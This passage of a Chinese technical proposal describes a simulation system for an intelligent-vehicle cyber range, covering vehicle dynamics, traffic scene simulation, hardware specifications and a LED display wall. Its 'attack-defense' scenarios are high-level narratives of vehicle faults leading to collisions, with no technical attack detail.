车辆性能和优化模型。为了管理模型、数据、仿真和结果，可以使用版本控制系统、数据库管理系统和仿真工具。这些工具可以帮助组织和跟踪模型和数据的变化，管理仿真任务和结果的流程，以及提供可视化和报告功能，便于团队合作和决策。</li><li>内嵌自动化测试工具和脚本工具在车辆动力学模型的开发和验证过程中发挥着重要的作用，同时支持前处理和后处理模式。这些工具提供了自动化的测试和脚本化的处理功能，支持前处理和后处理操作，以提高开发效率和验证准确性。自动化测试工具可以自动执行一系列测试用例，验证模型在不同场景和输入条件下的行为和性能。它们可以模拟现实驾驶情况，如加速、制动、转弯和紧急情况，检查模型的响应和结果是否符合预期。通过自动化测试，可以减少手动测试的工作量，提高测试的覆盖率和一致性。脚本工具支持前处理和后处理操作，用于数据的准备和分析。前处理操作包括数据的清洗、筛选和转换，以确保输入数据的质量和一致性。后处理操作涉及对仿真结果的处理、计算和可视化，以生成有意义的分析和报告。脚本工具可以自动化这些操作，提高数据处理的效率和准确性。内嵌自动化测试工具和脚本工具还可以与版本控制系统和持续集成工具集成，实现自动化的测试和工作流程。它们可以与模型和数据的版本关联，自动触发测试和处理操作，并生成相应的报告和记录。这样，团队成员可以更好地跟踪和管理开发和验证过程，提高团队的协作和效率。</li><li>支持根据车辆模型的运动方程，利用三维刚体的线运动量和角运动量，选取所需自由度的车辆模型，建立运动方程，开发基于多体动力学的车辆模型。基于多体动力学的车辆模型开发涉及建立车辆的运动方程，以描述车辆在三维空间中的运动行为。首先，选择所需自由度的车辆模型，通常包括车辆的线运动和角运动自由度。线运动自由度包括车辆的位置和速度，而角运动自由度则包括车辆的姿态和角速度。通过应用刚体动力学理论，可以基于车辆的质量、惯性矩阵和外部力矩，建立车辆的运动方程。运动方程将描述车辆在空间中的加速度和角加速度，以及与其相关的力和力矩。这些方程可以通过牛顿运动定律和欧拉动力学方程进行推导和求解。在开发过程中，车辆的动力学特性，如悬挂系统、转向系统和驱动系统等。这些特性将影响车辆的运动方程和模型的准确性。因此，需要根据车辆的实际构造和参数进行模型的参数化和校准。基于多体动力学的车辆模型提供了对车辆运动行为的全面描述，包括加速度、速度、位置、姿态和角速度等关键参数。这些模型可以用于仿真和分析车辆的动力学性能，如操纵稳定性、车辆响应和轨迹跟踪等。</li><li>就该模块分别开发了悬架装置、轮胎、转向、防滑杆等底盘构成组件。悬架装置是连接车身和轮胎的关键组件，它通过弹簧和减振器等元件来支撑和缓解车辆在不平路面上的震动和冲击。悬架装置的设计需要考虑到车辆的稳定性、操纵性和乘坐舒适性，以提供良好的悬挂效果和路面适应性。轮胎是车辆与地面之间的唯一接触点，对车辆的操纵、制动和加速性能起着至关重要的作用。它们通常由胎面、胎体和胎圈组成，具有特定的胎面花纹和胎压要求，以适应不同的路面条件和行驶需求。轮胎的设计需要考虑到抓地力、悬挂负荷传递、耐磨性和舒适性等方面。转向系统控制车辆的转向运动，包括方向盘、转向机构和转向器等组件。它使驾驶员能够控制车辆的转向角度，从而改变车辆的行驶方向。转向系统需要具备良好的灵敏度、稳定性和可靠性，以确保驾驶员的操纵指令能够准确传达给车辆的前轮。防滑杆是一种安全装置，用于防止车辆在制动时发生轮胎抱死现象。它通过监测车轮的转速差异，并根据需要调整制动力分配，以保持车轮的最佳抓地力和制动效果。防滑杆的主要目标是提高制动性能、减少制动距离和保持车辆的稳定性。</li></ol><h3 id="影像系统"><a href="#影像系统" class="headerlink" title="影像系统"></a>影像系统</h3><h4 id="功能与性能参数需求-4"><a href="#功能与性能参数需求-4" class="headerlink" title="功能与性能参数需求"></a>功能与性能参数需求</h4><ol><li>显示系统正面应采用大于1200毫米X 700毫米、侧面大于820毫米X 600毫米的尺寸和分辨率Full HD以上的显示器；</li><li>音响系统支持展示行车过程中的各类声音，应采用5.1CH，输出功率不低于90w；</li><li>主控PC的CPU不低于13代i7，内存不低于16G DDR4，显卡不低于GTX4060，硬盘不低于500G SSD，标配Win10以上操作系统。</li></ol><h4 id="功能实施方案-37"><a href="#功能实施方案-37" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>该显示系统正面采用尺寸1200毫米X 700毫米的显示器，侧面尺寸820毫米X 600毫米。此外，该显示器具有分辨率为Full HD以上，提供出色的图像质量和清晰度，以满足高要求的显示需求。这种显示系统适用于需要显示大量信息或高分辨率内容的场景，为用户提供更广阔的视野和更精确的图像展示。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4d85d49339310c6ec0d43c18075e97fc.png" alt="企业微信截图_17051359931983"></p><ol><li>音响系统支持展示行车过程中的各类声音，采用5.1声道（5.1CH）配置。这种配置包括左前、右前、中央、左后、右后五个声道以及一个低音炮（Subwoofer），能够提供更加立体和沉浸式的音频体验。此外，音响系统的输出功率应为90瓦特（w），以确保足够的音量和音质表现。这样的音响系统能够为驾驶员和乘客带来优质的声音效果，提升行车过程中的娱乐和舒适体验。</li><li>主控PC的配置为CPU：13代i7处理器，内存：16GB DDR4，显卡：GTX 4060，硬盘：500GB SSD，操作系统：标配Win10以上操作系统。该PC能提供足够的的计算性能和流畅的操作体验，可以处理复杂的任务和多线程应用，能够满足主控PC在智能汽车网络靶场动态仿真系统中的计算和处理需求。</li></ol><h3 id="道路交通场景仿真软件"><a href="#道路交通场景仿真软件" class="headerlink" title="道路交通场景仿真软件"></a>道路交通场景仿真软件</h3><h4 id="功能与性能参数需求-5"><a href="#功能与性能参数需求-5" class="headerlink" title="功能与性能参数需求"></a>功能与性能参数需求</h4><ol><li>软件的开放性好，采用业内认可程度高、通用性强和开放性好的标准；</li><li>能够快速构建仿真道路；</li><li>支持复杂路网快速建模，包含复杂不规则路口，横纵向起伏，交通标识与信号灯；</li><li>可以设置不同道路形态的模型，包括多车道、交叉路口、环岛、道路出口/入口、坡道、匝道、立交桥、污损等；</li><li>支持雨雪雾天气条件和白天夜晚光线条件下的环境仿真；</li><li>具备交通工况仿真能力，交通参与方涵盖轿车、SUV、卡车、摩托车、行人、动物等，并具备时间/事件出发能力；</li><li>支持理想超声波、毫米波、摄像头、激光雷达传感器模型仿真；</li><li>支持实时物理级复杂摄像头和激光雷达传感器模型的仿真；</li><li>支持录制与回放功能；</li></ol><h4 id="功能实施方案-38"><a href="#功能实施方案-38" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>道路交通场景仿真软件具备高度的开放性和标准化，确保其广泛的应用和可靠的性能。该软件采用开放式架构设计，遵循国际通用的标准和规范，以便与其他软件进行集成和互操作。用户可以轻松地将其与其他交通仿真软件或交通规划系统进行整合，实现数据共享和协同工作。此外，该软件遵循广泛认可的行业标准，以确保其通用性和互操作性。这些标准为道路交通场景提供了统一的描述和数据交换格式，使得不同软件之间的数据共享和对比成为可能。通过采用开放的标准和规范，该软件能够与其他交通仿真软件进行无缝对接，提高了用户的灵活性和可扩展性。用户可以根据自己的需求和实际情况选择适合的软件进行组合使用，实现更加全面和准确的交通仿真分析。</li><li>通过使用先进的计算机图形技术和虚拟现实技术，可以快速构建仿真道路。通过高精度的地形数据、道路标志和交通标识的模型，以及逼真的光照和材质效果，可以创建出逼真的道路环境。同时，利用仿真引擎和物理引擎，可以模拟车辆的行驶和交互，包括车辆运动、碰撞检测和物理效果。这样可以快速创建出具有真实感的仿真道路，用于测试和验证智能汽车的性能和安全性。</li><li>利用道路建模工具和技术，可以快速构建复杂路网的建模仿真环境。通过精确的地形数据和道路几何信息，可以创建出具有复杂不规则路口和横纵向起伏的道路。同时，交通标识和信号灯等交通设施可以被准确地模拟和呈现，以提供真实的交通环境。通过结合虚拟现实技术和物理引擎，可以实现车辆与道路的交互，包括遵守交通规则、响应交通信号和交通标识等。这样的仿真环境可以用于测试智能汽车在复杂路况下的感知、决策和控制能力，为智能汽车的开发和验证提供重要支持。</li><li>利用道路建模工具和技术，可以快速构建支持不同道路形态的仿真模型环境。系统可以创建多车道道路，包括直行车道、左转车道和右转车道等。交叉路口、环岛和道路出口/入口等复杂交通场景也可以精确建模。此外，坡道、匝道和立交桥等特殊道路构造也可以被准确模拟。而且，系统还可以模拟道路的污损情况，例如道路表面的积水、泥泞或冰雪等。通过这样的道路模型，可以全面测试智能汽车在各种复杂道路形态下的行驶和驾驶能力，以验证其性能和安全性，并进行相关算法和系统的优化和改进。</li><li>支持在不同的天气条件下进行环境仿真，包括雨天、雪天和雾天等恶劣天气条件。系统可以模拟出雨滴、雪花或雾气效果，并将其应用到道路和周围环境中，以提供真实的天气效果。这样的仿真环境可以帮助测试智能汽车在恶劣天气条件下的感知、决策和控制能力，以评估其安全性和可靠性。系统还支持在不同的光线条件下进行环境仿真，包括白天和夜晚。在白天仿真中，系统可以模拟出阳光的照射和天空的明亮度，以及阴影和反射等效果。而在夜晚仿真中，系统可以模拟出路灯、车灯和其他光源的照明效果，以营造夜间行驶的真实感。</li><li>具备交通工况仿真能力，可以模拟各种交通参与方在道路上的行为和互动。系统可以模拟轿车、SUV、卡车、摩托车、行人、动物等各种交通参与方，并根据其特征和行为规则进行仿真。轿车和SUV可以按照道路规则行驶，卡车可能需要更大的转弯半径和更长的制动距离，摩托车可能会穿梭于车流中，行人可能会过马路或者等待红绿灯，动物可能会突然穿越道路等。此外，系统还具备时间/事件出发能力，可以在仿真中设置不同的时间和事件触发条件。例如，可以设置仿真开始时的时间和日期，以模拟不同的季节和天气条件。还可以设置特定事件的触发，如交通事故、道路施工、紧急情况等，以评估智能汽车在不同场景和突发事件下的应对能力和安全性。</li><li>智能汽车网络靶场动态仿真系统支持理想超声波、毫米波、摄像头和激光雷达传感器模型的仿真。对于超声波传感器模型，系统可以模拟传感器的工作原理和测量范围。超声波传感器可以发射超声波脉冲，并通过接收回波来测量距离和检测障碍物。系统可以根据物体的位置和几何形状，计算超声波传感器的回波强度和延迟时间，以生成虚拟的超声波传感器数据。对于毫米波雷达传感器模型，系统可以模拟雷达的工作原理和探测范围。毫米波雷达可以发射毫米波信号，并通过接收回波来测量距离、速度和角度等信息。系统可以根据物体的反射特性和运动状态，计算毫米波雷达的回波强度和多普勒频移，以生成虚拟的毫米波雷达数据。对于摄像头传感器模型，系统可以模拟摄像头的成像原理和视野范围。摄像头可以捕捉道路和周围环境的图像信息，并通过图像处理算法进行目标检测和识别。系统可以生成虚拟的摄像头图像，并根据物体的位置、颜色和纹理等特征，模拟摄像头的视觉感知能力。对于激光雷达传感器模型，系统可以模拟激光雷达的工作原理和扫描范围。激光雷达可以发射激光束，并通过接收反射回波来测量距离和生成点云数据。系统可以根据物体的位置和形状，计算激光雷达的回波强度和点云数据，以生成虚拟的激光雷达数据。通过这样的传感器模型仿真，可以为智能汽车的感知系统提供真实的传感器数据，以测试其对不同类型障碍物的检测和识别能力，并评估其在复杂环境中的感知性能和安全性。</li><li>智能汽车网络靶场动态仿真系统可以支持实时物理级的复杂摄像头和激光雷达传感器模型的仿真。对于摄像头传感器模型，系统可以模拟真实摄像头的光学物理特性，包括镜头参数、光圈、曝光时间等。系统可以生成高分辨率的图像，并模拟光线的传播、散射和折射等物理过程，以产生真实的图像效果。同时，系统还可以模拟图像传感器的噪声、色彩校正和图像处理算法等，以提供更真实的图像数据。对于激光雷达传感器模型，系统可以模拟激光束的发射和接收过程，包括激光的功率、波长、束宽等参数。系统可以计算激光与物体之间的相互作用，包括反射、散射和吸收等过程，以生成真实的点云数据。同时，系统还可以考虑激光雷达的旋转扫描和多线束扫描等特性，以模拟真实的激光雷达感知效果。通过支持实时物理级的复杂摄像头和激光雷达传感器模型的仿真，智能汽车网络靶场动态仿真系统可以提供更真实、准确的传感器数据，以评估智能汽车的感知系统在复杂场景和真实环境中的性能。这有助于验证智能汽车的感知能力和决策能力，提高其在真实道路上的安全性和可靠性。</li><li>智能汽车网络靶场动态仿真系统支持录制和回放功能，以便对仿真场景和传感器数据进行记录和重现。通过录制功能，系统可以记录智能汽车在仿真场景中的行驶轨迹、传感器数据和控制指令等信息。这些记录的数据可以保存为文件，以备后续使用。通过回放功能，系统可以加载之前录制的数据文件，并按照记录的时间顺序重现智能汽车的行为和传感器数据。这样可以实现对仿真场景的准确重现，并进行多次测试和分析。</li></ol><p>本系统的仿真场景，可以实现对于仿真场景、天气、交通流等要素的灵活编辑，根据需求进行仿真场景的定制化开发。</p><p>基于场景软件开发完整的仿真道路场景，自动高效的交通场景仿真，包含全面的交通场景仿真软件套件，包含实时车辆模型开发、实时动画软件开发、虚拟驾驶环境开发，可实现不同形式的研究需要。</p><table><thead><tr><th><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e5257f1f26b003435448873e733266fc.png" alt="公路上的汽车 描述已自动生成"></th></tr></thead></table><p>仿真场景中将设置典型的交通标志牌和信号灯，并为信号灯设置与场景匹配的规则，提升场景的真实度和沉浸感。</p><table><thead><tr><th><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/86bb4efb84370ccad6cc3f73887e172f.jpeg" alt="夜晚的马路上 描述已自动生成"></th></tr></thead></table><p>虚拟仿真场景中有不同的环境配置，包括白天与黑夜，晴天与阴天，以及雨雪等极端天气，可以在控制器中选择和切换。道路场景中可以根据需求加入不同的交通状态，如拥堵交通流，超车车辆等，模拟车辆在道路上遇到的不同情况。此外，场景中设置由AI控制的行人，行人可以根据车辆行为做出不同的行为，如躲避，确认车辆停稳后过马路等。</p><table><thead><tr><th><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/129100af857741fe7afd2b7034d79698.png" alt="人在路上行驶的汽车 中度可信度描述已自动生成"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/17903e6be76d0dd7d7672f57e26acbe6.png" alt="公路上有许多车 描述已自动生成"></th></tr></thead></table><h3 id="自动驾驶攻防演示场景"><a href="#自动驾驶攻防演示场景" class="headerlink" title="自动驾驶攻防演示场景"></a>自动驾驶攻防演示场景</h3><h4 id="功能与性能参数需求-6"><a href="#功能与性能参数需求-6" class="headerlink" title="功能与性能参数需求"></a>功能与性能参数需求</h4><ol><li>支持SUA场景的攻防：意外加速<ol><li>自适应巡航ACC利用国道自动驾驶；</li><li>车辆突然加速到设定速度以上；</li><li>ACC不可以解除，与前车追尾。</li></ol></li><li>支持LKA场景的攻防：车道保持辅助功能故障<ol><li>使用车道保持辅助装置自动驾驶；</li><li>车道保持辅助装置故障，导致车辆驶入侧车道；</li><li>与左侧车道车辆发生追尾。</li></ol></li><li>支持AEB场景的攻防：自主紧急制动失效<ol><li>利用ACC的高速公路自动驾驶；</li><li>制动出现异常信号，车辆突然制动；</li><li>被后车追尾。</li></ol></li><li>支持TSR场景的攻防：交通标志识别故障<ol><li>利用ACC的高速公路自动驾驶；</li><li>交通标志（限速标志）识别故障，导致超速行驶；</li><li>未确保ACC安全制动距离，与前车相撞。</li></ol></li><li>支持EO场景的攻防；发动机意外熄火<ol><li>驾驶员在市内道路上行驶；</li><li>当进入交叉口是，发动机意外熄火；</li><li>无法重新启动，导致追尾事故。</li></ol></li><li>支持EOC场景的攻防：油门故障<ol><li>驾驶员在高速公路上行驶；</li><li>在直行加速区域行驶中，由于油门故障无法加速反而减速；</li><li>导致与后方车辆发生追尾事故。</li></ol></li><li>支持EB场景的攻防：制动失效<ol><li>驾驶员在国道上行驶；</li><li>进入紧急弯道区域；</li><li>因制动故障，无法控制车速，导致车道偏离。</li></ol></li><li>支持IHBC场景的攻防：智能远光灯控制故障<ol><li>驾驶员在国道上行驶；</li><li>进入急转弯车道区域；</li><li>自动变换近光灯和远光灯，无法辨别车道，导致偏离车道。</li></ol></li></ol><h4 id="功能实施方案-39"><a href="#功能实施方案-39" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>支持SUA场景的攻防：意外加速</li></ol><p>在自适应巡航控制（ACC）的国道自动驾驶模式下，车辆正常地利用ACC来保持与前车的安全距离。然而，突然之间，车辆的加速系统出现故障，导致车辆加速超过设定速度。由于ACC无法解除，车辆无法及时减速，并最终与前车发生追尾事故的攻防演示场景。</p><ol><li>支持LKA场景的攻防：车道保持辅助功能故障</li></ol><p>在使用车道保持辅助装置的自动驾驶模式下，车辆正常地依靠车道保持辅助装置来保持在车道内行驶。然而，由于车道保持辅助装置发生故障，车辆无法准确识别车道边界，导致车辆偏离主车道并驶入侧车道。最终，与左侧车道的车辆发生追尾事故的攻防演示场景。</p><ol><li>支持AEB场景的攻防：自主紧急制动失效</li></ol><p>在ACC的高速公路自动驾驶模式下，车辆依靠自主紧急制动系统来避免与前方障碍物的碰撞。然而，制动系统出现异常信号，导致车辆突然进行紧急制动。这突如其来的制动动作使后方车辆无法及时反应，导致追尾事故的发生的攻防演示场景。</p><ol><li>支持TSR场景的攻防：交通标志识别故障</li></ol><p>在ACC的高速公路自动驾驶模式下，车辆依靠交通标志识别系统来识别道路上的交通标志，例如限速标志。然而，交通标志识别系统发生故障，导致车辆无法准确识别限速标志，从而超速行驶。由于ACC未能确保安全的制动距离，车辆与前方车辆发生碰撞事故的攻防演示场景。</p><ol><li>支持EO场景的攻防：发动机意外熄火</li></ol><p>驾驶员在市区道路上行驶，当驶入交叉口时，由于发动机出现故障，车辆的发动机意外熄火。驾驶员尝试重新启动发动机，但无法成功，导致车辆无法移动，最终发生追尾事故的攻防演示场景。</p><ol><li>支持EOC场景的攻防：油门故障</li></ol><p>驾驶员在高速公路上行驶，进入直行加速区域时，由于油门系统出现故障，车辆无法加速反而减速。驾驶员试图通过踩油门来恢复正常加速，但油门仍然无法正常工作，导致后方车辆与本车发生追尾事故的攻防演示场景。</p><ol><li>支持EB场景的攻防：制动失效</li></ol><p>驾驶员在国道上行驶，车辆进入紧急弯道区域。然而，由于制动系统出现故障，驾驶员无法控制车速，导致车辆无法及时减速，最终车辆偏离车道并发生事故的攻防演示场景。</p><ol><li>支持IHBC场景的攻防：智能远光灯控制故障</li></ol><p>驾驶员在国道上行驶，车辆进入急转弯车道区域。然而，自动远光灯控制系统发生故障，无法正确识别车道和前方车辆，导致车辆偏离车道并发生事故的攻防演示场景。</p><p>为验证自动驾驶的安全性与可靠性，本方案搭建一套基于沙盘的自动驾驶演示场景，演示步骤为：</p><p>1. 环境搭建：准备一个沙盘模型，代表一个道路网络和周围环境。使用合适的比例和细节来模拟真实的道路情况，包括车道、交叉口、路标、交通信号灯等。</p><p>2. 车辆模拟：选择一个或多个自动驾驶车辆模型，并放置在沙盘上。确保车辆模型与实际车辆的尺寸和特征相匹配。</p><p>3. 传感器模拟：为车辆模型添加传感器模拟器，模拟自动驾驶车辆常用的传感器，如摄像头、激光雷达、雷达等。这些传感器将用于感知周围环境并获取数据。</p><p>4. 自动驾驶算法：为车辆模型加载自动驾驶算法，模拟车辆的决策和控制过程。这些算法可以是预先定义的规则或基于机器学习的模型。</p><p>5. 演示场景设计：设计一个或多个自动驾驶场景，例如道路变道、交叉口通行、避障等。确保场景具有挑战性，并涵盖不同的交通情况和道路条件。</p><p>6. 演示执行：在沙盘上执行自动驾驶演示，模拟车辆的行为和决策过程。观察车辆如何感知环境、做出决策并执行动作。</p><p>7. 故障模拟：模拟自动驾驶系统的故障情况，例如传感器故障、算法错误等。观察系统如何处理故障情况，并评估其容错性和安全性。</p><h3 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a>技术实现</h3><h4 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h4><p>智能驾驶网络安全动态仿真系统是为了提供安全、舒适和智能化的驾驶体验而设计的。它可以帮助发现和修复漏洞，验证安全改进，提供安全培训和教育，支持决策制定，保障车辆和乘客的安全。通过利用该系统，智能驾驶系统可以更好地应对网络安全挑战，提高整体的安全性和可靠性。智能驾驶网络安全动态仿真系统具有以下应用价值：</p><ul><li>安全评估和漏洞发现：智能驾驶网络安全动态仿真系统可以模拟真实的网络环境，对智能驾驶系统进行全面的安全评估和漏洞发现。通过模拟各种攻击场景和网络威胁，系统可以检测和识别潜在的漏洞和安全风险，帮助开发者和厂商及时修复和加固系统，提高智能驾驶系统的安全性。</li><li>漏洞修复和改进验证：智能驾驶网络安全动态仿真系统可以模拟和复现已知的漏洞和攻击，帮助开发者验证修复措施的有效性和系统的改进。通过不断的漏洞修复和改进验证，系统可以逐步提升智能驾驶系统的安全性和抗攻击能力，降低潜在的安全风险。</li><li>安全培训和教育：智能驾驶网络安全动态仿真系统可以作为安全培训和教育的工具，帮助开发者、工程师和驾驶员了解和掌握智能驾驶系统的网络安全知识和技术。通过模拟真实的攻击场景和网络威胁，系统可以提供实践性的培训和教育，提高人员的安全意识和应对能力，从而减少人为因素对智能驾驶系统安全的影响。</li><li>策略制定和决策支持：智能驾驶网络安全动态仿真系统可以帮助决策者和管理者制定安全策略和决策，并提供决策支持。通过模拟不同的安全威胁和攻击场景，系统可以评估不同策略和决策的风险和影响，帮助决策者做出明智的决策，保护智能驾驶系统的安全和可靠性。</li><li>车辆和乘客安全保障：智能驾驶网络安全动态仿真系统可以有效保障车辆和乘客的安全。通过不断的安全评估和漏洞发现，系统可以及时发现和修复潜在的安全隐患，提高车辆的防护能力和安全性能。这将有助于减少事故和故障的发生，保护乘客的生命和财产安全。</li></ul><h4 id="功能方案"><a href="#功能方案" class="headerlink" title="功能方案"></a>功能方案</h4><p>智能驾驶网络安全动态仿真系统由以下模块组成：</p><p>1. 反力装置：</p><p>功能参数响应如下：智能驾驶座舱配备了反力装置，用于模拟车辆行驶时的加速、制动和转向等力反馈。</p><p>功能参数响应如下：反力装置能够根据车辆的动态状态和驾驶操作提供逼真的力反馈，增强驾驶者的感知和控制能力。</p><p>2. 动力学模型：</p><p>功能参数响应如下：智能驾驶座舱内置了车辆的动力学模型，能够准确模拟车辆在不同驾驶条件下的行驶特性。</p><p>功能参数响应如下：动力学模型可以实时计算车辆的速度、加速度、转速等参数，并将其用于反力装置的控制和驾驶信息的显示。</p><p>3. 影像系统：</p><p>功能参数响应如下：智能驾驶座舱配备了高清晰度的影像系统，用于显示车辆周围的实时影像。</p><p>功能参数响应如下：影像系统可以通过车载摄像头获取车辆周围的图像，并将其显示在仪表盘或中央显示屏上，帮助驾驶者更好地了解周围环境。</p><p>4. 仪表盘：</p><p>功能参数响应如下：智能驾驶座舱的仪表盘提供了多个显示模块，包括速度、转速、温度/警告、发动机/电池故障、驾驶信息和AVN（音频、视频、导航）信息等。</p><p>功能参数响应如下：驾驶者可以通过仪表盘清晰地查看车辆的关键信息，以便实时监控车辆的状态和驾驶情况。</p><p>5. 操作台：</p><p>功能参数响应如下：智能驾驶座舱配备了人机交互的操作台，包括按钮、旋钮、触摸屏等控制设备。</p><p>功能参数响应如下：驾驶者可以通过操作台进行车辆的各项操作，如调节座椅、控制空调、切换驾驶模式等，以满足个性化的需求和偏好。</p><p>6. 运动平台：</p><p>功能参数响应如下：智能驾驶座舱配备了运动平台，能够模拟车辆在行驶过程中的运动感觉。</p><p>功能参数响应如下：运动平台可以根据车辆的加速、制动和转向等操作提供相应的运动效果，使驾驶者更加身临其境地感受到驾驶的乐趣和真实性。</p><p>通过以上功能，智能驾驶座舱方案能够提供驾驶者所需的反力装置、动力学模型、影像系统、仪表盘、操作台和运动平台等功能。驾驶者可以通过仪表盘清晰地查看车辆的关键信息，使用操作台进行各项操作，并通过反力装置和运动平台获得逼真的驾驶感觉。这将提升驾驶者的驾驶体验，增强驾驶者的感知和控制能力，从而实现更安全、舒适和智能化的驾驶环境。</p><h1 id="智能汽车网络靶场攻防演练大屏系统"><a href="#智能汽车网络靶场攻防演练大屏系统" class="headerlink" title="智能汽车网络靶场攻防演练大屏系统"></a>智能汽车网络靶场攻防演练大屏系统</h1><h2 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h2><p>智能汽车网络靶场攻防演练大屏系统旨在为用户提供一个高清、实时、直观的仿真验证、测试、竞赛、演练及安全运营的可视化基础设施。该系统将通过一系列先进的技术和设备，为汽车网络靶场的运行提供全面的支持。</p><p>为实现上述目标，智能汽车网络靶场攻防演练大屏系统将包含以下关键组件和能力：</p><p>1. 全彩LED显示屏：提供高清晰度、高分辨率的显示效果，确保仿真验证、测试、竞赛、演练等场景的视觉效果逼真。</p><p>2. 电源：为整个系统提供稳定、可靠的电力供应，确保各个设备正常运行。</p><p>3. 控制电脑：作为系统的核心控制单元，负责处理和协调各项任务，实现高效的数据处理和传输。</p><p>4. 数据运算分布器：对大量数据进行快速、准确的运算和处理，满足实时性和准确性的要求。</p><p>5. 信号射频识别融合器：实现对信号的精准识别和融合，提高信号传输的稳定性和可靠性。</p><p>6. 信号映射影音终端：将接收到的信号进行高质量的映射和显示，为用户提供清晰、流畅的影音体验。</p><p>7. 网络数据防御平台：构建强大的网络防御体系，有效应对各种网络攻击和威胁，保障系统安全稳定运行。</p><p>8. 配电柜、机柜、线阵列音柱、多功能商用功率放大器、无线手持话筒、音频处理器、调音台等辅助设备：为系统提供全方位的支持，确保各个功能模块正常运行，满足用户多样化的需求。</p><p>为用户提供一个高效、可靠的智能汽车网络靶场攻防演练大屏系统，助力用户实现更好的仿真验证、测试、竞赛、演练及安全运营可视化效果。</p><p>网络靶场攻防演练大屏采用山东泰克COB倒装LED大屏，COB（Chip-on-Board）倒装展示大屏是一种创新的显示技术，它采用了先进的封装技术和倒装工艺，将LED芯片直接封装在显示屏背板上，实现了更高的像素密度和更广泛的视角范围。以下是对COB倒装展示大屏的描述：</p><p>COB倒装展示大屏以其卓越的视觉效果和出色的可靠性而备受关注。它的独特设计使得LED芯片直接连接到显示屏背板上，消除了传统封装中的导线和基板，大大提高了像素密度和显示效果。</p><p>COB倒装展示大屏具有出色的色彩表现力和高对比度，能够呈现出鲜艳、细腻的图像和视频内容。其高亮度和广阔的视角范围，使得观众无论从任何角度观看，都能享受到清晰、逼真的视觉体验。</p><p>此外，COB倒装展示大屏的倒装工艺使得LED芯片与显示屏背板紧密结合，有效提高了屏幕的抗震性和抗冲击性能。这种设计还能有效降低能耗，提高屏幕的可靠性和稳定性，延长使用寿命。</p><p>COB倒装展示大屏广泛应用于室内和室外场所，如商业广告牌、体育场馆、会议中心等。其灵活的模块化设计，使得大屏可以根据实际需求进行自由组合和拼接，实现各种尺寸和形状的显示效果。</p><p>总之，COB倒装展示大屏以其卓越的视觉效果、高可靠性和灵活性，成为现代显示技术中的重要创新。它为各种场合提供了出色的视觉展示解决方案，为观众带来震撼人心的视觉享受。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/24f420b5d6c6da54ce65187de74455b4.png"></p><h2 id="技术路线-4"><a href="#技术路线-4" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="全彩LED显示屏"><a href="#全彩LED显示屏" class="headerlink" title="全彩LED显示屏"></a>全彩LED显示屏</h3><h4 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h4><p>全彩LED显示屏采用山东泰克的COB007型 显示屏，该屏采用了先进的封装技术和倒装工艺，将LED芯片直接封装在显示屏背板上，实现了更高的像素密度和更广泛的视角范围。技术实现方式如下：</p><ul><li>COB封装技术：COB封装技术是一种将LED芯片直接封装在显示屏背板上的技术。在COB封装中，LED芯片通过微焊接技术直接连接到显示屏背板上的金属线路上，而不需要传统封装中的导线和基板。这种直接封装的方式使得LED芯片与显示屏背板之间的距离非常接近，实现了更高的像素密度和更广泛的视角范围。</li><li>倒装工艺：COB倒装显示屏采用倒装工艺，即将LED芯片倒装到显示屏背板上。在倒装过程中，首先将LED芯片通过微焊接技术连接到显示屏背板上的金属线路上。然后，将LED芯片倒置放置在显示屏背板上，使其正面朝下。这种倒装的方式可以有效减小LED芯片与观察者之间的距离，提高观看效果。</li><li>像素密度提高：由于COB倒装显示屏采用了直接封装和倒装工艺，LED芯片与显示屏背板之间的距离非常接近，从而实现了更高的像素密度。LED芯片之间的间距更小，可以在有限的显示区域内容纳更多的LED芯片，使得显示屏的分辨率更高，图像更细腻</li><li>视角范围扩大：COB倒装显示屏的倒装工艺使得LED芯片正面直接暴露在外，而不需要传统封装中的透光胶体。这样一来，观察者可以从更广阔的角度观看显示屏，而不会出现颜色变化或亮度降低的情况。COB倒装显示屏具有更广泛的视角范围，使得观众无论从哪个角度观看，都能获得清晰、逼真的视觉效果。</li></ul><h4 id="实施方案"><a href="#实施方案" class="headerlink" title="实施方案"></a>实施方案</h4><p>品牌：山东泰克，型号：COB007</p><ol><li>像素点间距:0.793mm, 像素密度1587203Pixels/m2；提供CMA、ILAC-MRA、CNAS认证并盖章的第三方权威机构的检测报告复印件；</li><li>单元箱体尺寸：宽609.6mm，高342.9mm，采用超薄压铸铝16：9（609.6:342.9=16:9）比例箱体设计；</li><li>箱体平整度≤0.1mm，相邻箱体之间的平整度≤0.1mm； 